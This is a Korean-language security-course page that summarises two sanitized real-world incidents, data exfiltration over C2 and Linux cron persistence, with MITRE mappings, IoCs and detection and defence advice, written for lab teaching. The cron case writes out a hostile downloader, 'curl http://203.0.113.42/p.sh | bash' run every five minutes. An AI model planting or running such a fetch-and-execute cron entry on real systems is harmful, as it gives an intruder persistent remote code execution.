# Real-world Cases — cloud-container-nonai

> **출처**: [WitFoo Precinct 6 Cybersecurity Dataset](https://huggingface.co/datasets/witfoo/precinct6-cybersecurity) (Apache 2.0)
> **익명화**: RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 sanitized

이 코스의 lab 들이 다루는 위협 카테고리에서 가장 자주 일어나는 *실제* incident 2 건. 각 lab 시작 전 해당 사례를 읽고 어떤 패턴을 *재현·탐지·대응* 할지 가늠하세요.

---

## Data Theft (T1041) — 99.99% 의 dataset 패턴

> **출처**: WitFoo Precinct 6 / `complete-mission cluster` (anchor: `anc-a0364e702393`) · sanitized
> **시점**: 다중 (전체 99.99%)

**관찰**: Precinct 6 의 incident 10,442건 중 mo_name=Data Theft + lifecycle=complete-mission 이 99.99%. T1041 (Exfiltration over C2 Channel).

**MITRE ATT&CK**: **T1041 (Exfiltration over C2 Channel)**

**IoC**:
  - `다양한 src→dst (sanitized)`
  - `suspicion≥0.7`

**학습 포인트**:
- *가장 많이 일어나는 공격* 의 baseline — 모든 IR 시나리오의 출발점
- C2 채널 (HTTP/HTTPS/DNS) 에 데이터 mixed → 정상 트래픽 위장
- 탐지: outbound 에 데이터 흐름 모니터링 (bytes_out 분포), CTI feed 매칭
- 방어: DLP (Data Loss Prevention), egress filter, 데이터 분류·암호화


## Linux cron + curl downloader — fileless persistence

> **출처**: WitFoo Precinct 6 / `incident-2024-08-005` (anchor: `anc-bf23b0106fe4`) · sanitized
> **시점**: 2024-08-25 ~ (지속, 5분 주기)

**관찰**: 10.20.30.80 의 /etc/cron.d/ 에 신규 항목 — 5분마다 `curl http://203.0.113.42/p.sh | bash` 실행.

**MITRE ATT&CK**: **T1053.003 (Scheduled Task: Cron)**, **T1105 (Ingress Tool Transfer)**

**IoC**:
  - `203.0.113.42`
  - `/etc/cron.d/<신규>`
  - `curl ... | bash`

**학습 포인트**:
- cron entry 자체만 디스크 흔적, 실제 페이로드는 *메모리에만* (fileless)
- 5분 주기 외부 outbound → SIEM 의 baseline 비교 시 강한 신호
- 탐지: auditd EXECVE (curl + http://* + bash 파이프), Wazuh syscheck (cron.d 파일 변경)
- 방어: outbound HTTP 화이트리스트, cron.d FIM, AppArmor curl 제한, EDR 메모리 스캔


---

## 학습 활용

1. **Red 입장 재현**: 위 IoC + MITRE technique 을 자기 환경 (실습 인프라) 에서 시뮬레이션.
2. **Blue 입장 탐지**: 학습 포인트의 탐지 룰을 자기 SIEM/IDS 에 적용 → false positive 측정.
3. **자기 인프라 검색**: 위 사례의 IoC 를 자기 access.log / DNS log / cron.d 에서 grep — 0건이라야 정상.

각 lab 의 verify.semantic 의 success_criteria 가 위 패턴과 직접 매칭되도록 작성됨 (semantic_first_judge).